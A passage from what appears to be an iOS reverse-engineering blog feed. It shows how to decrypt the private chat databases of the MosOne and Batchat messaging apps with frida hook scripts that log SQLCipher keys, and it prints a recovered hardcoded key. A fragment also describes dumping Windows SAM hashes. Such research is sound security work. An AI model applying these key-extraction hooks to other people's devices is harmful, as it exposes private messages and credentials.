    <summary type="html">&lt;h2 id=&quot;使用场景&quot;&gt;&lt;a href=&quot;#使用场景&quot; class=&quot;headerlink&quot; title=&quot;使用场景&quot;&gt;&lt;/a&gt;使用场景&lt;/h2&gt;&lt;p&gt;已获取system权限，无法在目标机器上上传Mimikatz(有杀软或者限制啥的)，这个时候可以通过reg命令导出SAM和S</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>默往数据库解密</title>
    <link href="https://vxer-lee.github.io/2020/07/02/%E9%BB%98%E5%BE%80%E6%95%B0%E6%8D%AE%E5%BA%93%E8%A7%A3%E5%AF%86/"/>
    <id>https://vxer-lee.github.io/2020/07/02/%E9%BB%98%E5%BE%80%E6%95%B0%E6%8D%AE%E5%BA%93%E8%A7%A3%E5%AF%86/</id>
    <published>2020-07-02T04:50:11.000Z</published>
    <updated>2021-06-04T01:50:58.541Z</updated>
    
    <content type="html"><![CDATA[<h2 id="盗墓准备：砸壳"><a href="#盗墓准备：砸壳" class="headerlink" title="盗墓准备：砸壳"></a>盗墓准备：砸壳</h2><p>用<code>frida-ios-dump</code>，命令行<code>python3 dump.py -p 2222 com.mostone.life0627</code>。具体过程略过……</p><h2 id="分金定穴：分析"><a href="#分金定穴：分析" class="headerlink" title="分金定穴：分析"></a>分金定穴：分析</h2><h3 id="搜索关键字"><a href="#搜索关键字" class="headerlink" title="搜索关键字"></a>搜索关键字</h3><p>搜索关键字<code>chatMessageV3.db</code>，定位到函数<code>-[ChatMessageBDManage creatDB]</code><br><img src="/images/%E9%BB%98%E5%BE%80%E8%81%8A%E5%A4%A9%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20200819133008260.png" alt="image-20200819133008260"></p><h3 id="userId"><a href="#userId" class="headerlink" title="userId"></a>userId</h3><p>获取userId，将userID转换成MD5<br><img src="/images/%E9%BB%98%E5%BE%80%E8%81%8A%E5%A4%A9%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20200819144724992.png" alt="image-20200819144724992"></p><h3 id="cipherkey"><a href="#cipherkey" class="headerlink" title="cipherkey"></a>cipherkey</h3><p>将MD5与cipherkey拼接。<br><img src="/images/%E9%BB%98%E5%BE%80%E8%81%8A%E5%A4%A9%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20200819145016463.png" alt="image-20200819145016463"></p><h2 id="起棺盗墓：frida-hook"><a href="#起棺盗墓：frida-hook" class="headerlink" title="起棺盗墓：frida hook"></a>起棺盗墓：frida hook</h2><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><p>POC：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * MosOne 默往聊天记录数据库密钥HOOK POC</span></span><br><span class="line"><span class="comment"> * by Lee</span></span><br><span class="line"><span class="comment"> * 专注逆向、网络安全</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/*setCipherKey 函数*/</span></span><br><span class="line">  onEnter: <span class="function"><span class="keyword">function</span> (<span class="params">log, args, state</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> myString = <span class="keyword">new</span> ObjC.Object(args[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">var</span> NSData = ObjC.classes.NSData;</span><br><span class="line">    <span class="keyword">var</span> ssss = NSData.alloc().initWithData_(myString);</span><br><span class="line">    log(<span class="string">&quot;数据库密码长度：&quot;</span>+ssss.length());</span><br><span class="line">    log(<span class="string">&quot;数据库密码：&quot;</span>);</span><br><span class="line">    log(hexdump(ssss.bytes(),&#123;</span><br><span class="line">      length: ssss.length(),</span><br><span class="line">      header: <span class="literal">true</span>,</span><br><span class="line">      ansi: <span class="literal">true</span></span><br><span class="line">    &#125;));</span><br><span class="line">    log(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*返回值*/</span></span><br><span class="line">  onLeave: <span class="function"><span class="keyword">function</span> (<span class="params">log, retval, state</span>) </span>&#123;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h3><p><img src="/images/%E9%BB%98%E5%BE%80%E8%81%8A%E5%A4%A9%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20200819151627348.png" alt="image-20200819151627348"> </p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;盗墓准备：砸壳&quot;&gt;&lt;a href=&quot;#盗墓准备：砸壳&quot; class=&quot;headerlink&quot; title=&quot;盗墓准备：砸壳&quot;&gt;&lt;/a&gt;盗墓准备：砸壳&lt;/h2&gt;&lt;p&gt;用&lt;code&gt;frida-ios-dump&lt;/code&gt;，命令行&lt;code&gt;python3 dump</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>蝙蝠聊天数据库解密</title>
    <link href="https://vxer-lee.github.io/2020/07/01/%E8%9D%99%E8%9D%A0%E8%81%8A%E5%A4%A9%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/"/>
    <id>https://vxer-lee.github.io/2020/07/01/%E8%9D%99%E8%9D%A0%E8%81%8A%E5%A4%A9%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/</id>
    <published>2020-07-01T04:50:11.000Z</published>
    <updated>2021-06-04T02:05:39.132Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><p>iOS蝙蝠是一款安全的聊天软件,传输协议和内容都采用了端对端非对称加密。支持双向撤回、阅后即焚、匿名聊天、自动销毁,同时支持文件和邮件的端对端加密传输。消息不经过服务器、客户端多层加密隧道登…</p><h2 id="盗墓准备：砸壳"><a href="#盗墓准备：砸壳" class="headerlink" title="盗墓准备：砸壳"></a>盗墓准备：砸壳</h2><p>用庆总Frida框架的<code>frida-ios-dump</code>砸壳工具，其下载地址为<a href="https://github.com/AloneMonkey/frida-ios-dump">https://github.com/AloneMonkey/frida-ios-dump</a><br>刚开始我砸壳并没有成功，后来发现是需要更新frida-ios-dump才可以砸成功，这与iOS版本或frida版本都有关系。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#查看进程ID 应用名 包名</span></span><br><span class="line">python3 dump.py -l</span><br><span class="line"><span class="comment">#对蝙蝠APP进行砸壳.</span></span><br><span class="line">iproxy 2222 22</span><br><span class="line">python3 dump.py -p 2222 com.woyue.batchat</span><br></pre></td></tr></table></figure><p><img src="/images/%E8%9D%99%E8%9D%A0%E8%81%8A%E5%A4%A9%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20200818133931373.png" alt="image-20200818133931373"><br><img src="/images/%E8%9D%99%E8%9D%A0%E8%81%8A%E5%A4%A9%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20200818134413336.png" alt="image-20200818134413336"></p><h2 id="分金定穴：定位"><a href="#分金定穴：定位" class="headerlink" title="分金定穴：定位"></a>分金定穴：定位</h2><p>砸了壳后直接提取出蝙蝠可执行文件，扔到<code>IDA</code>或者<code>Hopper</code>里面分析。</p><h3 id="加密数据库关键字"><a href="#加密数据库关键字" class="headerlink" title="加密数据库关键字"></a>加密数据库关键字</h3><p>直接搜索加密数据库字符串交叉引用查看调用的函数<code>batChatBD</code> <code>FTSDB</code> <code>user_config</code></p><h3 id="batChatBD数据库解密"><a href="#batChatBD数据库解密" class="headerlink" title="batChatBD数据库解密"></a>batChatBD数据库解密</h3><p><code>batChatBD</code>数据库 ，sqlcipher和aes都是固定密钥,这..🦇也太不安全了吧。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;* @class WBFDBManager *&#x2F;</span><br><span class="line">&#x2F;&#x2F;可以看到秘钥是固定的，是对字符串&quot;batChatMsgPwd1234560&quot; 进行加密处理，具体是进行AES加密最后Base64Encode下</span><br><span class="line">r0 &#x3D; [@&quot;batChatMsgPwd1234560&quot; encryptWithkey:@&quot;1&quot;];</span><br><span class="line">&#123;</span><br><span class="line">  &#x2F;&#x2F;AES加密  密钥：&quot;Batchat12345678#&quot;</span><br><span class="line">CCCrypt(r19, 0x1, 0x1, [r0 UTF8String], 0x8, [@&quot;Batchat12345678#&quot; UTF8String], r23, r22, r20, r22 + 0x8 &amp; 0xfffffffffffffff8, &amp;var_58);</span><br><span class="line">&#x2F;&#x2F;Base64编码</span><br><span class="line">[r22 base64EncodedDataWithOptions:0x0];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;PageSize大小是传入了一个地址，这里直接看不到内容，需要HOOK获取。</span><br><span class="line">[r23 setCipherKey:[[r0 dataUsingEncoding:0x1 allowLossyConversion:0x1] retain] andCipherPageSize:*(int32_t *)0x101760440];</span><br></pre></td></tr></table></figure><p><img src="/images/%E8%9D%99%E8%9D%A0%E8%81%8A%E5%A4%A9%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20200818141001693.png" alt="image-20200818141001693"><br><img src="/images/%E8%9D%99%E8%9D%A0%E8%81%8A%E5%A4%A9%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20200818142301564.png" alt="image-20200818142301564"></p><h3 id="batChatBD-hook验证"><a href="#batChatBD-hook验证" class="headerlink" title="batChatBD hook验证"></a>batChatBD hook验证</h3><p>接下来进行HOOK的验证，最近比较喜欢用<code>frida</code>来HOOK，简单方便。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#frida-trace frida函数追踪命令行客户端</span></span><br><span class="line"><span class="comment">#-U 代表连接方式USB</span></span><br><span class="line"><span class="comment">#-f 需要HOOK的包名</span></span><br><span class="line"><span class="comment">#-m 代表需要HOOK的 OC方法名,*代表匹配所有。</span></span><br><span class="line">➜  iOSre frida-trace -U -f com.woyue.batchat -m <span class="string">&quot;-[WCTDatabase setCipherKey:andCipherPageSiz*]&quot;</span></span><br><span class="line"></span><br><span class="line">Instrumenting <span class="built_in">functions</span>...</span><br><span class="line">-[WCTDatabase setCipherKey:andCipherPageSize:]: Loaded handler at <span class="string">&quot;/Users/xxx/Documents/iOSre/__handlers__/__WCTDatabase_setCipherKey_andCi_d4cddb79.js&quot;</span></span><br><span class="line">Started tracing 1 <span class="keyword">function</span>. Press Ctrl+C to stop.</span><br><span class="line">           /* TID 0x403 */</span><br><span class="line">   701 ms  -[WCTDatabase setCipherKey:0x280b6f5d0 andCipherPageSize:0x800]</span><br><span class="line"></span><br><span class="line"><span class="comment">#可以看到hook到了WCTDatabase类的 setCipherKey:andCipherPageSize方法，其中密钥是一个NSData对象的地址，所以这里需要对js文件进行修改才能正确输出其十六进制或字符串，而页大小为0x800，也就是2048的十六进制。</span></span><br></pre></td></tr></table></figure><p><img src="/images/%E8%9D%99%E8%9D%A0%E8%81%8A%E5%A4%A9%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20200818143621733.png" alt="image-20200818143621733"></p><p>修改后的<code>__WCTDatabase_setCipherKey_andCi_d4cddb79.js</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">onEnter: <span class="function"><span class="keyword">function</span> (<span class="params">log, args, state</span>) </span>&#123;</span><br><span class="line">    log(<span class="string">&#x27;-[WCTDatabase setCipherKey:&#x27;</span> + args[<span class="number">2</span>] + <span class="string">&#x27; andCipherPageSize:&#x27;</span> + args[<span class="number">3</span>] + <span class="string">&#x27;]&#x27;</span>);</span><br><span class="line">    <span class="keyword">var</span> myString = <span class="keyword">new</span> ObjC.Object(args[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">var</span> NSData = ObjC.classes.NSData;</span><br><span class="line">    <span class="keyword">var</span> ssss = NSData.alloc().initWithData_(myString);</span><br><span class="line">    log(<span class="string">&quot;数据库密码长度：&quot;</span>+ssss.length());</span><br><span class="line">    log(<span class="string">&quot;数据库密码：&quot;</span>);</span><br><span class="line">    log(hexdump(ssss.bytes(),&#123;</span><br><span class="line">      length: ssss.length(),</span><br><span class="line">      header: <span class="literal">true</span>,</span><br><span class="line">      ansi: <span class="literal">true</span></span><br><span class="line">    &#125;));</span><br><span class="line">    log(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">  &#125;,</span><br></pre></td></tr></table></figure><p><code>batChatBD</code>加密数据库   密钥：<code>DKrF2tB3U5vi39kVODmsbY0UW5Scn8rW</code>  页大小：<code>2048</code><br><img src="/images/%E8%9D%99%E8%9D%A0%E8%81%8A%E5%A4%A9%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20200818144913788.png" alt="image-20200818144913788"></p><h3 id="FTSDB-数据库解密"><a href="#FTSDB-数据库解密" class="headerlink" title="FTSDB 数据库解密"></a>FTSDB 数据库解密</h3><p>和batChatBD的方法一样，也是字符串搜索<code>FTSDB</code>关键字，然后再查看交叉引用关系，定位到其创建数据库的函数。</p><p><code>这里的设置密钥函数和batChatBD的不一样，这里没有设置页大小，也就是用了默认的页大小</code>，我通过查看WCDB源码发现，默认的页大小为4096，<code>WCDB是腾讯开源的一个高效、完整、易用的移动数据库框架，基于SQLCipher，支持 iOS、macOS 和 Android</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">r0 &#x3D; [@&quot;FTSDBPWD&quot; encryptWithkey:@&quot;2&quot;];</span><br><span class="line">r25 &#x3D; [[r0 dataUsingEncoding:0x1 allowLossyConversion:0x1] retain];</span><br><span class="line">[r23 setCipherKey:r25];</span><br></pre></td></tr></table></figure><p><img src="/images/%E8%9D%99%E8%9D%A0%E8%81%8A%E5%A4%A9%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20200818145807201.png" alt="image-20200818145807201"> </p><h3 id="user-config-数据库解密"><a href="#user-config-数据库解密" class="headerlink" title="user_config 数据库解密"></a>user_config 数据库解密</h3><p>读取<code>keychain</code>中的<code>WCDB.BATUSERCONFIGKEY</code>字段内容设为sqlcipher密钥，和FTSDB一样也是默认页大小，4096.</p><p>如果keychain中没有WCDB.BATUSERCONFIGKEY字段则随机生成64位的十六进制作为sqlcipher密钥，并存入keychain当中。</p><p><img src="/images/%E8%9D%99%E8%9D%A0%E8%81%8A%E5%A4%A9%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20200818153437735.png" alt="image-20200818153437735"></p><p><img src="/images/%E8%9D%99%E8%9D%A0%E8%81%8A%E5%A4%A9%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20200818153643131.png" alt="image-20200818153643131"> </p><h3 id="FTSDB-和-user-config数据库密钥-hook"><a href="#FTSDB-和-user-config数据库密钥-hook" class="headerlink" title="FTSDB 和 user_config数据库密钥 hook"></a>FTSDB 和 user_config数据库密钥 hook</h3><p>因为FTSDB和user_config数据库设置密钥方法是同一个，都是用的<code>-[WCTDatabase setCipherKey:]</code> 默认页大小。所以放到这里来统一进行frida 的hook验证。</p><h4 id="启动Frida-hook："><a href="#启动Frida-hook：" class="headerlink" title="启动Frida hook："></a>启动Frida hook：</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  iOSre frida-trace -U -f com.woyue.batchat -m <span class="string">&quot;-[WCTDatabase setCipherKey:]&quot;</span></span><br></pre></td></tr></table></figure><p>修改对应<code>__WCTDatabase_setCipherKey__.js</code>JS文件内容</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">onEnter: <span class="function"><span class="keyword">function</span> (<span class="params">log, args, state</span>) </span>&#123;</span><br><span class="line">    log(<span class="string">&#x27;-[WCTDatabase setCipherKey:&#x27;</span> + args[<span class="number">2</span>] + <span class="string">&#x27;]&#x27;</span>);</span><br><span class="line">    <span class="keyword">var</span> myString = <span class="keyword">new</span> ObjC.Object(args[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">var</span> NSData = ObjC.classes.NSData;</span><br><span class="line">    <span class="keyword">var</span> ssss = NSData.alloc().initWithData_(myString);</span><br><span class="line">    log(<span class="string">&quot;数据库密码长度：&quot;</span>+ssss.length());</span><br><span class="line">    log(<span class="string">&quot;数据库密码：&quot;</span>);</span><br><span class="line">    log(hexdump(ssss.bytes(),&#123;</span><br><span class="line">      length: ssss.length(),</span><br><span class="line">      header: <span class="literal">true</span>,</span><br><span class="line">      ansi: <span class="literal">true</span></span><br><span class="line">    &#125;));</span><br><span class="line">    log(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">  &#125;,</span><br></pre></td></tr></table></figure><h4 id="再次启动frida-hook验证"><a href="#再次启动frida-hook验证" class="headerlink" title="再次启动frida hook验证"></a>再次启动frida hook验证</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  iOSre frida-trace -U -f com.woyue.batchat -m <span class="string">&quot;-[WCTDatabase setCipherKey:]&quot;</span></span><br></pre></td></tr></table></figure><p><img src="/images/%E8%9D%99%E8%9D%A0%E8%81%8A%E5%A4%A9%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20200818154550865.png" alt="image-20200818154550865"></p><p>keychain相关的知识，这里不多说了自行百度，或者对<a href="https://github.com/ptoomey3/Keychain-Dumper">https://github.com/ptoomey3/Keychain-Dumper</a> 项目进行学习研究。<br><img src="/images/%E8%9D%99%E8%9D%A0%E8%81%8A%E5%A4%A9%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20200818154803167.png" alt="image-20200818154803167"></p><h2 id="起棺盗墓：附件匹配"><a href="#起棺盗墓：附件匹配" class="headerlink" title="起棺盗墓：附件匹配"></a>起棺盗墓：附件匹配</h2><p>这其中定位的过程花了很长时间，是从一个函数一步步追踪验证到最后直接HOOK到参数为附件的绝对路径的函数，然后结果分析用的是MD5算法，将附件URL地址MD5加密成附件名 + 后缀。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-[WBFChatFileCacheManager chatFilePath:placeFileData:progress:completion:];</span><br><span class="line">int sub_1000d5dd8();</span><br><span class="line">CC_MD5();</span><br></pre></td></tr></table></figure><p><img src="/images/%E8%9D%99%E8%9D%A0%E8%81%8A%E5%A4%A9%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20200818162135910.png" alt="image-20200818162135910"></p><h3 id="CC-MD5-js脚本"><a href="#CC-MD5-js脚本" class="headerlink" title="CC_MD5.js脚本"></a>CC_MD5.js脚本</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * CC_MD5 HOOK脚本</span></span><br><span class="line"><span class="comment"> * by: Lee</span></span><br><span class="line"><span class="comment"> * 专注逆向、网络安全</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/*函数参数*/</span></span><br><span class="line">  onEnter: <span class="function"><span class="keyword">function</span> (<span class="params">log, args, state</span>) </span>&#123;</span><br><span class="line">    <span class="comment">//将md5参数转换成字符串并打印</span></span><br><span class="line">    <span class="keyword">var</span> md5_data = args[<span class="number">0</span>].readUtf8String();</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;MD5 - 参数值:&quot;</span>);</span><br><span class="line">    <span class="built_in">console</span>.error(md5_data);</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*函数返回值*/</span></span><br><span class="line">  onLeave: <span class="function"><span class="keyword">function</span> (<span class="params">log, retval, state</span>) </span>&#123;</span><br><span class="line">    <span class="comment">//将md5返回值转码为32位字符串并打印</span></span><br><span class="line">    <span class="keyword">var</span> md5_digest = hexdump(retval , &#123;<span class="attr">length</span>: <span class="number">16</span>&#125;)</span><br><span class="line">    <span class="keyword">var</span> hexified = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> raw_array = md5_digest.split(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> a = <span class="number">0</span>; a &lt; raw_array.length; a++) &#123;</span><br><span class="line">      <span class="keyword">var</span> line_array = raw_array[a].split(<span class="string">&quot; &quot;</span>);</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">var</span> b = <span class="number">1</span>; b &lt; line_array.length - <span class="number">1</span> ; b++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (line_array[b].length === <span class="number">2</span>) &#123;</span><br><span class="line">          hexified += line_array[b];</span><br><span class="line">          hexified = hexified.trim()</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;MD5 - 返回值:&quot;</span>);</span><br><span class="line">    <span class="built_in">console</span>.error(hexified + <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="hook-验证"><a href="#hook-验证" class="headerlink" title="hook 验证"></a>hook 验证</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  iOSre frida-trace -U -f com.woyue.batchat -i <span class="string">&quot;CC_MD5&quot;</span></span><br></pre></td></tr></table></figure><p><img src="/images/%E8%9D%99%E8%9D%A0%E8%81%8A%E5%A4%A9%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20200818162525337.png" alt="image-20200818162525337"><br><img src="/images/%E8%9D%99%E8%9D%A0%E8%81%8A%E5%A4%A9%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20200818162624969.png" alt="image-20200818162624969">   </p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言：&quot;&gt;&lt;a href=&quot;#前言：&quot; class=&quot;headerlink&quot; title=&quot;前言：&quot;&gt;&lt;/a&gt;前言：&lt;/h2&gt;&lt;p&gt;iOS蝙蝠是一款安全的聊天软件,传输协议和内容都采用了端对端非对称加密。支持双向撤回、阅后即焚、匿名聊天、自动销毁,同时支持文件和邮</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>iOS 动态调试のdebugserver</title>
    <link href="https://vxer-lee.github.io/2020/02/06/iOS%20%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E3%81%AEdebugserver/"/>
    <id>https://vxer-lee.github.io/2020/02/06/iOS%20%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E3%81%AEdebugserver/</id>
    <published>2020-02-06T09:30:34.000Z</published>
    <updated>2021-06-04T01:30:55.080Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>iOS逆向里面比较重要的几项技能：动态调试、静态分析、HOOK关键函数、重签名</p></blockquote><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>先来讲下动态调试，iOS动态调试需要一个服务端和客户端程序，服务端程序在手机上监听要动态调试程序的进程ID或是程序名，客户端程序在Mac OS系统上运行。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">服务端程序:debugserver</span><br><span class="line">客户端程序:lldb</span><br><span class="line"><span class="comment">#这两个程序不用额外的去外网下载，只要你的Mac电脑有装XCode，并且进行真机调试过（真机调试一般可以在淘宝买UDID开发者证书，就是和你手机UDID绑定的证书那么你就可以在你手机上安装开发你的APP|土豪（开发者账号））</span></span><br></pre></td></tr></table></figure><p>只要你手机进行真机调试过，那么在你手机的这个目录下就会有debugserver</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/Developer/usr/<span class="built_in">bin</span>/debugserver</span><br><span class="line"><span class="comment">#不过这个debugserver 默认只能调试自己开发的APP，我们逆向当然是要逆别人的程序，所以想要debugserver能调试三方APP，需要进行一些修改，下面就是修改的一些重点。</span></span><br></pre></td></tr></table></figure><h2 id="配置debugserver-赋予权限"><a href="#配置debugserver-赋予权限" class="headerlink" title="配置debugserver 赋予权限"></a>配置debugserver 赋予权限</h2><p>debugserver默认只能调试自己开发的应用，调试其他应用会抛异常<code>unable to start the exception thread</code>。默认的debugserver缺少<code>task_for_pid()</code>权限，因此需要给debugserver赋予task_for_pid权限。——这是网上摘抄的话</p><h3 id="网上过时方法"><a href="#网上过时方法" class="headerlink" title="网上过时方法"></a>网上过时方法</h3><p>我发现网上配置debugserver的方法已经过时，不适用iOS13系统，导致debugserver还是无法调试三方APP，所以按照如下方法进行。</p><h3 id="iOS13及以上配置方法"><a href="#iOS13及以上配置方法" class="headerlink" title="iOS13及以上配置方法"></a>iOS13及以上配置方法</h3><h4 id="新建一个文件名为ent-xml"><a href="#新建一个文件名为ent-xml" class="headerlink" title="新建一个文件名为ent.xml"></a>新建一个文件名为ent.xml</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">plist</span> <span class="meta-keyword">PUBLIC</span> <span class="meta-string">&quot;-//Apple//DTD PLIST 1.0//EN&quot;</span> <span class="meta-string">&quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">plist</span> <span class="attr">version</span>=<span class="string">&quot;1.0&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dict</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">key</span>&gt;</span>com.apple.backboardd.debugapplications<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">true</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">key</span>&gt;</span>com.apple.backboardd.launchapplications<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">true</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span 